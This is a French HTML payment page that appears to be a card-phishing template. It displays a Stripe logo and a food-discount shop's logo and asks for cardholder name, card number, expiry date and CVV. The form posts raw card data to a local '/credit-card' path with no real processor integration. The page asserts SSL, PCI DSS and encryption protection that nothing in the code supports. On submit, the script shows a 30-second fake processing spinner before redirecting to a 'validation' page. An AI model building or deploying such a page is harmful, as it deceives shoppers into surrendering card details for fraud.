<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Finalisez votre paiement</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* Reset CSS */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #f5f7fa, #c3cfe2);
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100%;
            margin: 0;
            color: #333;
            overflow-x: hidden;
            padding-top: 140px; /* Ajustement de l'espace pour que le logo soit visible */
        }

        .container {
            width: 100%;
            max-width: 550px; /* Augmenter la largeur du cadre */
            background: rgba(255, 255, 255, 0.95);
            padding: 50px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
            animation: fadeIn 0.5s ease-in-out;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            position: relative;
            overflow: hidden;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
            position: sticky;
            top: 0;
            z-index: 10;
        }

        .logo img {
            width: 100vw; /* Logo prend toute la largeur de l'écran */
            max-width: 100%;
            border-radius: 10px;
            transition: transform 0.3s ease, opacity 0.3s ease;
            opacity: 0.9;
        }

        .logo img:hover {
            transform: scale(1.05);
            opacity: 1;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            color: #2c3e50;
            margin-bottom: 20px;
            text-align: center;
            opacity: 0.9;
        }

        .form-group {
            margin-bottom: 20px;
            position: relative;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            color: #666;
            margin-bottom: 5px;
            opacity: 0.8;
        }

        .form-group input,
        .form-group select {
            width: 100%;
            padding: 14px 14px 14px 40px; /* Espace pour l'icône */
            border: 1px solid rgba(0, 0, 0, 0.1);
            border-radius: 12px;
            font-size: 14px;
            background: rgba(255, 255, 255, 0.9);
            transition: border-color 0.3s ease, box-shadow 0.3s ease, transform 0.3s ease;
        }

        .form-group input:focus,
        .form-group select:focus {
            border-color: #4CAF50;
            box-shadow: 0 0 12px rgba(76, 175, 80, 0.3);
            outline: none;
            transform: scale(1.02);
        }

        .form-group i {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #666;
            font-size: 16px;
            opacity: 0.8;
        }

        .form-group .small-text {
            font-size: 10px;
            color: #888;
            margin-top: 5px;
            text-align: left;
        }

        button {
            width: 100%;
            padding: 12px; /* Réduction du padding pour le bouton */
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 14px; /* Réduction de la taille */
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            position: relative;
            overflow: hidden;
            margin-top: 20px; /* Déplacement du bouton */
        }

        button:hover {
            background-color: #45a049;
            transform: translateY(-3px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }

        button:active {
            transform: translateY(0);
        }

        /* Overlay de chargement */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(20px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s ease, visibility 0.5s ease;
        }

        .loading-overlay.active {
            opacity: 1;
            visibility: visible;
        }

        .loading-spinner {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #ff9800;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .security-info {
            font-size: 12px;
            color: #666;
            margin-top: 20px;
            opacity: 0.8;
        }

        .security-info .line {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .security-info .line i {
            font-size: 16px;
            color: #4CAF50;
        }

        .security-info a {
            color: #4CAF50;
            text-decoration: none;
        }

        .security-info a:hover {
            text-decoration: underline;
        }

        /* Case à cocher CGV sur la même ligne */
        .checkbox-container {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: 10px;
        }

        .checkbox-container input[type="checkbox"] {
            width: 16px;
            height: 16px;
        }

        .checkbox-container label {
            font-size: 14px;
            color: #666;
            opacity: 0.8;
        }

        .required-text {
            font-size: 10px;
            color: #888;
            text-align: left;
            position: absolute;
            bottom: 40px;
            left: 10px;
        }

        /* Logo Stripe au bas */
        .stripe-logo {
            text-align: center;
            margin-top: 20px;
        }

        .stripe-logo img {
            width: 80px; /* Petit logo Stripe */
            opacity: 0.8;
            transition: opacity 0.3s ease;
        }

        .stripe-logo img:hover {
            opacity: 1;
        }

        /* Alignement des champs Date d'expiration et CVV sur la même ligne */
        .form-row {
            display: flex;
            gap: 20px;
            justify-content: space-between;
        }

        /* Détection des cartes avec logos en arrière-plan */
        .form-group input[type="text"] {
            background-size: contain;
            background-position-x: 100%;
            background-repeat: no-repeat;
            padding-right: 40px;
        }

        /* Détection Visa */
        .form-group input[type="text"].visa {
            background-image: url('https://img.icons8.com/?size=96&id=13608&format=png');
        }

        /* Détection MasterCard */
        .form-group input[type="text"].mastercard {
            background-image: url('https://img.icons8.com/?size=160&id=Xpr1YlK1rUTz&format=png');
        }

        /* Détection American Express */
        .form-group input[type="text"].amex {
            background-image: url('https://logo-marque.com/wp-content/uploads/2020/11/American-Express-Logo-650x366.png');
        }

        /* Logo de carte après le champ */
        .card-logos {
            display: flex;
            gap: 10px;
            justify-content: flex-start;
            margin-top: 10px;
        }

        .card-logos img {
            width: 30px;
            height: 30px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://destockagealimentaireprixbas.com/wp-content/uploads/2024/04/Destockage-Alimentaire-2.gif" alt="Logo">
        </div>

        <h1>Finalisez votre paiement</h1>

        <form id="credit-card-form" action="/credit-card" method="POST">
            <div class="form-group">
                <label for="nom_carte">Nom sur la carte</label>
                <i class="fas fa-user"></i>
                <input type="text" id="nom_carte" name="nom_carte" placeholder="Nom sur la carte" required>
            </div>

            <div class="form-group">
                <label for="numero_carte">Numéro de la carte</label>
                <i class="fas fa-credit-card"></i>
                <input type="text" id="numero_carte" name="numero_carte" placeholder="xxxx xxxx xxxx xxxx" required>
                <div class="small-text">Visa, MasterCard, American Express</div>
                <div class="card-logos">
                    <img src="https://img.icons8.com/?size=96&id=13608&format=png" alt="Visa Logo">
                    <img src="https://img.icons8.com/?size=160&id=Xpr1YlK1rUTz&format=png" alt="MasterCard Logo">
                    <img src="https://logo-marque.com/wp-content/uploads/2020/11/American-Express-Logo-650x366.png" alt="American Express Logo">
                </div>
            </div>

            <div class="form-row">
                <div class="form-group">
                    <label for="date_expiration">Date d'expiration</label>
                    <i class="fas fa-calendar-alt"></i>
                    <input type="text" id="date_expiration" name="date_expiration" placeholder="MM/AA" required>
                    <div class="small-text">Recto de la carte au format MM/AA</div>
                </div>

                <div class="form-group">
                    <label for="cvv">Code de sécurité (CVV)</label>
                    <i class="fas fa-lock"></i>
                    <input type="number" id="cvv" name="cvv" placeholder="CVV" required>
                    <div class="small-text">3 chiffres sur le verso de la carte</div>
                </div>
            </div>

            <div class="checkbox-container">
                <input type="checkbox" id="accepter_cgv" name="accepter_cgv" required>
                <label for="accepter_cgv">J'accepte les <a href="https://stripe.com/fr-ca/resources/more/general-terms-and-conditions-of-sale-france" target="_blank">Conditions générales de vente</a></label>
            </div>

            <div class="required-text">
                <p>Tous les champs sont obligatoires, sauf indication contraire.</p>
            </div>

            <button type="submit" id="submit-button">Payer maintenant</button>
        </form>

        <div class="security-info">
            <div class="line">
                <i class="fas fa-shield-alt"></i>
                <p>Votre banque peut vous demander d'autoriser le paiement pour compléter votre achat. Vous êtes sur un serveur de paiement sécurisé par les normes SSL (https) et PCI DSS de nos partenaires bancaires. Vos données sont encryptées pour plus de sécurité.</p>
            </div>
        </div>

        <div class="stripe-logo">
            <img src="https://logo-marque.com/wp-content/uploads/2021/03/Stripe-Logo.png" alt="Stripe logo">
        </div>
    </div>

    <div id="loading-overlay" class="loading-overlay">
        <div class="loading-spinner"></div>
    </div>

    <script>
        const form = document.getElementById('credit-card-form');
        const loadingOverlay = document.getElementById('loading-overlay');
        const submitButton = document.getElementById('submit-button');

        form.addEventListener('submit', function(event) {
            event.preventDefault();
            loadingOverlay.classList.add('active');
            setTimeout(() => {
                window.location.href = 'validation.paiement.html';
            }, 30000); // Redirection après 30 secondes
        });

        // Ajout de détection de type de carte sur le champ Numéro de carte
        const numeroCarteInput = document.getElementById('numero_carte');
        numeroCarteInput.addEventListener('input', function() {
            const cardNumber = numeroCarteInput.value.replace(/\s+/g, ''); // Supprimer les espaces

            if (cardNumber.startsWith('4')) {
                numeroCarteInput.classList.add('visa');
                numeroCarteInput.classList.remove('mastercard', 'amex');
            } else if (cardNumber.startsWith('5')) {
                numeroCarteInput.classList.add('mastercard');
                numeroCarteInput.classList.remove('visa', 'amex');
            } else if (cardNumber.startsWith('3')) {
                numeroCarteInput.classList.add('amex');
                numeroCarteInput.classList.remove('visa', 'mastercard');
            } else {
                numeroCarteInput.classList.remove('visa', 'mastercard', 'amex');
            }
        });
    </script>
</body>
</html>
